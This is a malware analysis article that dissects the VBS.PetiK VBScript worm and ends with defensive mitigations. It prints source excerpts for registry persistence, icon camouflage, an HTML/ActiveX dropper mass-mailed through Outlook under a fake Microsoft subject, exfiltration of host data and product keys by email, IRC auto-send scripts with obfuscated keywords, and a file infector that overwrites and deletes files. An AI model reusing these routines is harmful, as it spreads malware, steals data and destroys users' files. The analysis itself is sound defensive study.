# Dissecting VBS.PetiK: A Multi‑Vector VBScript Worm and File Infector 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
VBS.PetiK is a Windows Script Host (WSH) malware written in VBScript and dated January 2001. It blends multiple propagation channels—email (Outlook), IRC (mIRC and PIRCH), and direct file infection—with persistence and light camouflage. At runtime, the script copies itself into the Windows directory, tampers with file icon associations so .vbs files resemble .txt files, mass‑mails an HTML message that attempts to execute embedded VBScript via ActiveX, and drops IRC scripts to auto‑send itself to channel participants. It also exfiltrates host and configuration details to hard‑coded email addresses.

The source exemplifies early‑2000s tradecraft: simple string tricks (chr() sequences), permissive client automation, and broad file tampering rather than stealthy evasion. While modern OSes and mail gateways block many of these paths, the core ideas—social engineering, script automation, and abusing default associations—still echo in contemporary script droppers and HTML‑smuggling attacks. Breaking down the code clarifies how each capability works and where defenders can detect it reliably.

## Section 1 – Overview of the Malware 🐛
VBS.PetiK’s lifecycle follows a clear pattern:
- Persistence and camouflage: Copies itself to the Windows directory as `PetiK.txt.vbs` and writes an HKLM Run value so it launches at boot. It swaps the default icon for .vbs with the .txt icon to reduce suspicion in Explorer.
- Email propagation: Reads its own source, escapes it into a string, and constructs an HTML body that, when viewed with VBScript/ActiveX permitted, writes `Worm.vbs` to the temp directory and launches it. It BCC‑blasts the message to all Outlook address lists with the subject “Important Message From Microsoft Corporation.”
- IRC propagation: Locates mIRC/PIRCH and writes event scripts that automatically DCC‑send the persisted worm path to users on channel join.
- Exfiltration: Sends a second email via Outlook with host data (owner/organization, OS version and IDs, IE settings, language, and important folder paths) to two hard‑coded addresses.
- File infection and tampering: Recursively traverses writable drives, overwriting script files, converting some extensions to .vbs, and hiding or replacing others.

Targets are consumer and small‑office Windows systems of the time using Outlook and IRC clients, where VBScript execution and ActiveX in email were often enabled or user‑prompted. There’s no anti‑debugging or packing; the malware relies on client automation and user trust.

## Section 2 – Source Code Analysis 🔬
The script initializes common objects, reads its own source into memory, and enters the `DEBUT` routine, which performs persistence/camouflage and launches the propagation and infection stages.

### Persistence and Icon Camouflage
```vb
Set win  = fso.GetspecialFolder(0)
RUN      = ("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\PetiK")
Set c    = fso.GetFile(WScript.ScriptFullName)
PetiK    = (win & "\PetiK.txt.vbs")
c.Copy (PetiK)
ws.RegWrite RUN, PetiK

VBSI = ws.RegRead ("HKCR\VBSFile\DefaultIcon\")
TXTI = ws.RegRead ("HKCR\txtfile\DefaultIcon\")
ws.RegWrite "HKLM\Software\PetiK\ICONE VBS", VBSI
ws.RegWrite "HKCR\VBSFile\DefaultIcon\", TXTI
```
- The worm copies itself as `PetiK.txt.vbs` in the Windows folder and persists via an HKLM Run value (system‑wide autorun).
- It captures the existing .vbs default icon and sets the .vbs icon to the .txt icon, camouflaging scripts as text files in the shell UI.
- A vendor‑style marker under `HKLM\Software\PetiK` stores the original icon and gates later routines (values “OK” for MIRC/PIRCH/email steps).

### Outlook HTML/ActiveX Dropper and Mass Mailing
```vb
Set Myself = fso.opentextfile(wscript.scriptfullname, 1)
Do While Not Myself.atendofstream
  MyLine = Myself.readline
  Code = Code & Chr(34) & " & vbcrlf & " & Chr(34) & _
         Replace(MyLine, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
Loop
Myself.Close

htm = "<HTML>...<SCRIPT language=vbscript>" & vbCrLf & "On Error Resume Next"
htm = htm & vbCrLf & "Set fso = CreateObject(" & Chr(34) & _
      "Scripting.FileSystemObject" & Chr(34) & ")"
htm = htm & vbCrLf & "If Err.Number <> 0 Then"
htm = htm & vbCrLf & "document.write " & Chr(34) & _
      "You need ActiveX enabled..." & Chr(34)
htm = htm & vbCrLf & "Else"
htm = htm & vbCrLf & "Set vbs = fso.CreateTextFile(fso.GetSpecialFolder(1) & " & Chr(34) & _
      "\\Worm.vbs" & Chr(34) & ", True)"
htm = htm & vbCrLf & "vbs.write  " & Chr(34) & Code & Chr(34)
htm = htm & vbCrLf & "vbs.Close"
htm = htm & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
htm = htm & vbCrLf & "ws.run fso.GetSpecialFolder(0) & " & Chr(34) & _
      "\\wscript.exe " & Chr(34) & " & fso.getspecialfolder(1) & " & Chr(34) & "\\Worm.vbs %" & Chr(34)
```
- The code reads its own source and escapes double quotes so it can be embedded verbatim into an HTML VBScript payload.
- The HTML body attempts to write `Worm.vbs` into the temp directory and execute it via `wscript.exe` if ActiveX is enabled; otherwise, it displays a message urging users to enable ActiveX—overt social engineering.
- A separate loop constructs a BCC list for every address book and sends the HTML mail with subject “Important Message From Microsoft Corporation,” maximizing reach while hiding recipients.

### Exfiltration Email (Host Profiling)
```vb
Set msg2 = Outlook.CreateItem(0)
ComputerName = CreateObject("WScript.NetWork").ComputerName
NOM  = ws.RegRead ("HKLM\...\RegisteredOwner")
ENT  = ws.RegRead ("HKLM\...\RegisteredOrganization")
VER  = ws.RegRead ("HKLM\...\Version")
NUM  = ws.RegRead ("HKLM\...\VersionNumber")
REC1 = ws.RegRead ("HKLM\...\ProductId")
REC2 = ws.RegRead ("HKLM\...\ProductKey")
PFD  = ws.RegRead ("HKLM\...\ProgramFilesDir")
PDEM = ws.RegRead ("HKCU\...\Main\Start Page")
DDIR = ws.RegRead ("HKCU\...\Download Directory")
PAYS = ws.RegRead ("HKCU\...\International\AcceptLanguage")
WINDIR = fso.GetSpecialFolder(0): SYSDIR = fso.GetSpecialFolder(1)
TMPDIR = fso.GetSpecialFolder(2)
msg2.BCC = "petik@caramail.com;ppetik@hotmail.com"
msg2.Subject = "Message pour PetiK de " & NOM
msg2.Body = "..." ' assembled with the values above
msg2.Send
```
- The worm exfiltrates identifying data and system configuration to two hard‑coded email addresses. The payload includes OS version and keys, IE start/download settings, language, and key system paths (Windows, System, Temp, Program Files).
- This is basic but sensitive profiling information useful for tracking infections or staging follow‑on attacks.

### IRC Auto‑Send (mIRC and PIRCH)
```vb
PK2 = ws.regread("HKLM\...\Run\PetiK")
Set Script = fso.CreateTextFile(Path & "\script.ini", True)
Script.writeline "n0=on 1:JOIN:#:{"
Script.writeline "n1=  /if ( $nick == $me ) { halt }"
Script.writeline "n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick " & PK2
Script.writeline "n3=}"

' PIRCH (events.ini)
Script.WriteLine "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & _
                  " tsend $nick " & PK3
```
- The IRC scripts hook the channel JOIN event and auto‑send the persisted worm path to newcomers via DCC send/tsend. The string "dcc" is built with `chr(100) & chr(99) & chr(99)` to bypass naive keyword filters.
- Registry markers under `HKLM\Software\PetiK\MIRC` and `...\PIRCH` store “OK” to avoid repeating setup.

### File Infection and Tampering
```vb
ext = lcase(fso.GetExtensionName(f1.path))
If ext="vbs" Or ext="vbe" Then
  Set ap = fso.OpenTextFile(f1.path, 2, True): ap.Write vbscopie: ap.Close
ElseIf ext="js" Or ext="jse" Then
  ' overwrite then replace with .vbs
  Set ap = fso.OpenTextFile(f1.path, 2, True): ap.Write vbscopie: ap.Close
  bn = fso.GetBaseName(f1.path)
  fso.GetFile(f1.path).Copy(dossier & "\" & bn & ".vbs")
  fso.DeleteFile(f1.path)
ElseIf ext="exe" Or ext="ini" Or ext="gif" Or ext="jpg" Or ext="htm" Then
  Set cr = fso.CreateTextFile(f1.path & ".vbs"): cr.Write vbscopie: cr.Close
  fso.DeleteFile(f1.path)
ElseIf ext="mp3" Or ext="doc" Or ext="xls" Or ext="ppt" Or ext="hlp" Then
  att = fso.GetFile(f1.path): att.attributes = att.attributes + 2 ' hidden
End If
```
- The infector walks each fixed/removable drive and all subfolders. It overwrites VBS/VBE files with the worm, converts JS/JSE to VBS by writing the worm and renaming, and replaces EXE/INI/GIF/JPG/HTM with a .vbs file while deleting the original—destructive behavior that causes data loss. Documents and media (mp3/doc/xls/ppt/hlp) are hidden.
- This expands propagation and damages user data, confirming the malware’s destructive impact despite any “harmless” claims.

## Section 3 – Mitigation and Defense Strategies 🛡️
- Disable or restrict Windows Script Host (WSH). Where feasible, block wscript.exe/cscript.exe for non‑admin users or via application control (AppLocker/WDAC). Constrain VBScript usage in the enterprise.
- Harden Outlook and email gateways. Block script attachments (.vbs/.vbe), flag unusually large BCC lists, and detonate suspect HTML/MSG in sandboxes. Enforce policies that prevent ActiveX/VBScript execution in email clients.
- Monitor autoruns and file associations. Alert on new values under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` (e.g., key “PetiK”) and on changes to `HKCR\VBSFile\DefaultIcon`. These are high‑signal registry writes.
- Detect file‑system tampering. Watch for sudden creation of .vbs files adjacent to images/docs/executables, deletion of originals, or mass attribute changes to Hidden. EDR rules can flag high‑rate file rewrites by wscript.exe.
- IRC client controls. If mIRC/PIRCH is present, monitor integrity of `script.ini`/`events.ini` and outbound DCC traffic. Consider blocking DCC in perimeter or chat server policies.
- Network/mail telemetry. Look for automated Outlook COM operations and connections consistent with mass BCC mailings. Rate‑limit or block programmatic email from endpoints.
- Least privilege and backups. Running without admin rights can block HKLM writes and limit spread. Maintain tested backups to recover from destructive replacements (e.g., EXE/JPG/HTM turned into .vbs).
- User education. Teach users to avoid enabling ActiveX in emails and to distrust “urgent” subjects like “Important Message From Microsoft Corporation,” even if apparently legitimate.

## Conclusion
VBS.PetiK combines several classic early‑2000s tactics—autorun persistence, icon camouflage, Outlook HTML/ActiveX exploitation, IRC auto‑send, and aggressive file infection—into a compact VBScript package. Its reliance on permissive defaults and social engineering rather than stealth makes it noisy by modern standards, but also easier to detect with telemetry on registry keys, file associations, DCC activity, and scripted Outlook usage. The destructive file‑replacement logic underscores the need for both technical controls (WSH lockdown, application control, email sandboxing) and strong operational hygiene (backups, least privilege, user awareness). Understanding how each capability is implemented in source helps defenders place precise tripwires and respond quickly when similar patterns reappear.